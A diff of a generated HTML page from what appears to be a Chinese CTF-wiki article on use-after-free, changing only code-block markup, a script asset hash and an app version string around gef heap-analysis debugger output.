 <p>同时，我们还可以借助gef的heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下</p>
-<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap-analysis-helper</span> 
+<div class="codehilite"><pre><span></span><code><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap-analysis-helper</span> 
 <span class="p">[*]</span> <span class="no">This</span> <span class="no">feature</span> <span class="no">is</span> <span class="no">under</span> <span class="no">development</span><span class="p">,</span> <span class="no">expect</span> <span class="no">bugs</span> <span class="no">and</span> <span class="no">unstability...</span>
 <span class="err">[+]</span> <span class="nf">Tracking</span> <span class="no">malloc</span><span class="p">()</span>
 <span class="err">[+]</span> <span class="nf">Tracking</span> <span class="no">free</span><span class="p">()</span>
@@ -5365,7 +5365,7 @@ flag<span class="o">{</span>use_after_free<span class="o">}</span>--------------
 <span class="err">[</span><span class="nf">New</span> <span class="no">process</span> <span class="mi">36249</span><span class="p">]</span>
 <span class="nf">process</span> <span class="mi">36249</span> <span class="no">is</span> <span class="no">executing</span> <span class="no">new</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">cat</span>
 <span class="err">[</span><span class="nf">Inferior</span> <span class="mi">3</span> <span class="p">(</span><span class="no">process</span> <span class="mi">36249</span><span class="p">)</span> <span class="no">exited</span> <span class="no">normally</span><span class="p">]</span>
-</pre></div>
+</code></pre></div>
 
 <p>这里第一个输出了两次，应该是gef工具的问题。</p>
 <h2 id="_6">题目<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
@@ -5472,7 +5472,7 @@ flag<span class="o">{</span>use_after_free<span class="o">}</span>--------------
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5487,7 +5487,7 @@ flag<span class="o">{</span>use_after_free<span class="o">}</span>--------------
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
